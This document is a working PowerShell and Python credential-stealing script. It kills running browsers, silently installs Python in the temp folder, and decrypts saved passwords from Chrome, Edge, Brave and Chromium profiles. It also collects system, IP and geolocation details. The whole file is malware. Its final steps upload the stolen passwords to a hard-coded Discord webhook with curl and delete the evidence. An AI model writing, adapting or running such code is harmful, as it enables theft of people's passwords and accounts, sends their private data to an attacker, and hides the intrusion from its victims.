$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

# KILL ULTRA-AGRESSIF
Write-Host "Killing browsers..." -ForegroundColor Yellow
Stop-Process -Name brave* -Force -EA 0
Stop-Process -Name msedge* -Force -EA 0
Stop-Process -Name chrome* -Force -EA 0
Get-Process | Where {$_.ProcessName -like "*brave*"} | Stop-Process -Force -EA 0
Start-Sleep -Seconds 5

try{
# Python setup (identique)
$pyPath="$env:TEMP\py"
$needInstall=$false

if(!(Test-Path "$pyPath\python.exe")){
 $needInstall=$true
}else{
 cd $pyPath
 $testLibs=.\python.exe -c "import Crypto,win32crypt,requests;print('OK')" 2>$null
 if($testLibs -ne "OK"){$needInstall=$true}
}

if($needInstall){
 Write-Host "Installing Python..." -ForegroundColor Yellow
 Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30
 Expand-Archive "$env:TEMP\py.zip" $pyPath -Force
 (Get-Content "$pyPath\python311._pth") -replace '#import site','import site'|Out-File "$pyPath\python311._pth" -Encoding ascii
 Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$pyPath\gp.py" -UseBasicParsing
 cd $pyPath
 .\python.exe gp.py --no-warn-script-location 2>$null
 .\python.exe -m pip install pycryptodome pypiwin32 requests --quiet 2>$null
 Remove-Item "$env:TEMP\py.zip" -Force -EA 0
}

cd $pyPath

@'
import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time
from Crypto.Cipher import AES

try:
 import requests
 ip=requests.get("https://api.ipify.org",timeout=3).text
 geo=requests.get(f"http://ip-api.com/json/{ip}",timeout=3).json()
 location=f"{geo['city']}, {geo['regionName']}, {geo['country']}"
 isp=geo.get('isp','N/A')
except:
 ip="N/A"
 location="N/A"
 isp="N/A"

import locale
language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"

def d(db,st,n):
 try:
  if not os.path.exists(db):
   return []
  if not os.path.exists(st):
   return []
  
  with open(st,'r',encoding='utf-8') as f:
   local_state=json.load(f)
  
  encrypted_key=base64.b64decode(local_state["os_crypt"]["encrypted_key"])
  encrypted_key=encrypted_key[5:]
  k=win32crypt.CryptUnprotectData(encrypted_key,None,None,None,0)[1]
  
  temp_db=f"temp_{n}_{os.getpid()}_{time.time()}.db"
  
  # Attendre que le fichier soit accessible
  for attempt in range(10):
   try:
    if os.path.exists(temp_db):
     os.remove(temp_db)
    shutil.copy2(db,temp_db)
    break
   except Exception as e:
    if attempt < 9:
     time.sleep(1)
    else:
     return []
  
  r=[]
  try:
   c=sqlite3.connect(temp_db,timeout=30)
   cursor=c.cursor()
   cursor.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!='' AND password_value!=''")
   
   for row in cursor.fetchall():
    try:
     url=row[0]
     user=row[1]
     enc_pwd=row[2]
     
     if enc_pwd and len(enc_pwd)>15:
      nonce=enc_pwd[3:15]
      ciphertext=enc_pwd[15:-16]
      tag=enc_pwd[-16:]
      
      cipher=AES.new(k,AES.MODE_GCM,nonce=nonce)
      pwd=cipher.decrypt_and_verify(ciphertext,tag).decode('utf-8','ignore')
      
      r.append(f"[{n}] {url}\nUsername: {user}\nPassword: {pwd}\n")
    except Exception as e:
     pass
   
   c.close()
  except Exception as e:
   pass
  finally:
   try:
    if os.path.exists(temp_db):
     time.sleep(0.5)
     os.remove(temp_db)
   except:
    pass
  
  return r
  
 except Exception as e:
  return []

# SCAN COMPLET DU SYSTÈME
def scan_all_drives():
 """Scanner tous les disques pour trouver les navigateurs"""
 results=[]
 browsers_found=[]
 
 # Disques à scanner
 import string
 drives=[f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
 
 # Chemins standards
 user_paths=[
  os.path.expandvars(r"%LOCALAPPDATA%"),
  os.path.expandvars(r"%APPDATA%"),
  os.path.expandvars(r"%USERPROFILE%")
 ]
 
 # Patterns de recherche
 patterns=[
  ("Edge",r"Microsoft\Edge\User Data"),
  ("Brave",r"BraveSoftware\Brave-Browser\User Data"),
  ("Brave-Nightly",r"BraveSoftware\Brave-Browser-Nightly\User Data"),
  ("Brave-Beta",r"BraveSoftware\Brave-Browser-Beta\User Data"),
  ("Chrome",r"Google\Chrome\User Data"),
  ("Chromium",r"Chromium\User Data")
 ]
 
 # Scanner les chemins utilisateur
 for base_path in user_paths:
  for browser_name,pattern in patterns:
   full_path=os.path.join(base_path,pattern)
   if os.path.exists(full_path):
    browsers_found.append(f"{browser_name}: {full_path}")
    local_state=os.path.join(full_path,"Local State")
    
    if os.path.exists(local_state):
     # Default profile
     default_login=os.path.join(full_path,"Default","Login Data")
     if os.path.exists(default_login):
      pwd_list=d(default_login,local_state,f"{browser_name}-Default")
      results.extend(pwd_list)
     
     # Tous les profils
     for item in os.listdir(full_path):
      item_path=os.path.join(full_path,item)
      if os.path.isdir(item_path) and (item.startswith("Profile") or item.startswith("Person")):
       profile_login=os.path.join(item_path,"Login Data")
       if os.path.exists(profile_login):
        pwd_list=d(profile_login,local_state,f"{browser_name}-{item}")
        results.extend(pwd_list)
 
 # Scanner Program Files
 for drive in drives[:1]:  # Scanner seulement C:\ pour éviter la lenteur
  for pf in ["Program Files","Program Files (x86)"]:
   pf_path=os.path.join(drive,pf)
   if os.path.exists(pf_path):
    for browser_name,pattern in patterns:
     search_path=os.path.join(pf_path,pattern.split("\\")[0])
     if os.path.exists(search_path):
      # Chercher récursivement "User Data"
      for root,dirs,files in os.walk(search_path):
       if "User Data" in root and "Local State" in files:
        browsers_found.append(f"{browser_name}: {root}")
        local_state=os.path.join(root,"Local State")
        default_login=os.path.join(root,"Default","Login Data")
        if os.path.exists(default_login):
         pwd_list=d(default_login,local_state,f"{browser_name}-Default")
         results.extend(pwd_list)
 
 return results,browsers_found

# EXÉCUTER LE SCAN
res,browsers_found=scan_all_drives()

# Compter par navigateur
browser_counts={}
for item in res:
 browser=item.split("]")[0].strip("[")
 browser_counts[browser]=browser_counts.get(browser,0)+1

browser_info="\n".join([f"{k}: {v} passwords" for k,v in browser_counts.items()]) if browser_counts else "No passwords found"

# Informations système
info=f"""{'='*60}
SYSTEM INFORMATION
{'='*60}
Date/Time: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
OS: {platform.system()} {platform.release()}
Version: {platform.version()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Hostname: {socket.gethostname()}
Language: {language}
Public IP: {ip}
Location: {location}
ISP: {isp}
{'='*60}

BROWSERS DETECTED:
{browser_info}

TOTAL PASSWORDS: {len(res)}
{'='*60}

BROWSER PATHS FOUND:
{chr(10).join(browsers_found) if browsers_found else "No browser paths found"}
{'='*60}

"""

with open("p.txt","w",encoding="utf-8") as f:
 f.write(info)
 if res:
  f.write("\n".join(res))
 else:
  f.write("No passwords found.\n")

print("OK")
'@|Out-File "e.py" -Encoding UTF8

Write-Host "Running password extraction..." -ForegroundColor Yellow
$r=.\python.exe e.py 2>$null

if($r -eq "OK"){
 Write-Host "Uploading results..." -ForegroundColor Green
 curl.exe -F "file=@p.txt" $wh 2>$null
 Remove-Item p.txt,e.py -Force -EA 0
}

cd $env:TEMP

}catch{
 $err=$_.Exception.Message
 curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"Failed on $env:COMPUTERNAME - Error: $err`"}" $wh
}
